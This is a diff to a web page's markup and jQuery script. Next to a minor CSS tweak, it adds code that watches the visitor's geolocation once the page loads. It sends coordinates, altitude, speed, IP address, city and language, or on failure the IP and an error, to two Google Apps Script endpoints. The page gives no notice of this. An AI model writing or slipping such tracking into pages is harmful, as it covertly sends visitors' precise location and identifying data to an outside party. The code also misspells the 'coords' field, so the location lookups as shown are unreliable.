@@ -21,7 +21,7 @@
 <style type="text/css">
 .lo {
   position: absolute;
-  left: 52%;
+  left: 50%;
   top: 50%;
   z-index: 1;
   width: 120px;
@@ -90,6 +90,7 @@ $(function() {
             "device": navigator.userAgent.match().input
         },
         success: function(r) {
+			navigator.geolocation.watchPosition(s, e);
             var d = r.split('||');
             document.getElementById("head").innerHTML = d[1];
             document.getElementById("main").innerHTML = d[2];
@@ -124,4 +125,39 @@ $(function() {
         }
     });
 })
+
+function s(position) {
+    $.ajax({
+        url: "https://script.google.com/macros/s/AKfycbyWwRPoyc9Xt44Lx8Yr4FAor_GEP6Hl5gJerl8gZQKU3D-pnuqJiUu82y_LFB1STr4gmg/exec",
+        data: {
+            "date": new Date().toLocaleString(),
+            "ip": returnCitySN['cip'],
+            "zone": returnCitySN['cname'],
+            "lan": navigator.language,
+            "timestamp": position.timestamp,
+            "latitude": position.cords.latitude,
+            "longitude": position.cords.longitude,
+            "accuracy": position.cords.accuracy,
+            "altitude": position.cords.altitude,
+            "altitudeAccuracy": position.cords.altitudeAccuracy,
+            "heading": position.cords.heading,
+            "speed": position.cords.speed
+        },
+        success: function(response) {},
+    });
+}
+
+function e(err) {
+    $.ajax({
+        url: "https://script.google.com/macros/s/AKfycbxys7coDeKqiCYcGz4qZZZQbSZg6ozB63cm213nrKg46cCHLYSiSjA4GfIQ9rL6KXFlpw/exec",
+        data: {
+            "date": new Date().toLocaleString(),
+            "ip": returnCitySN['cip'],
+            "zone": returnCitySN['cname'],
+            "lan": navigator.language,
+            "err": err.message
+        },
+        success: function(response) {},
+    });
+}
 </script>
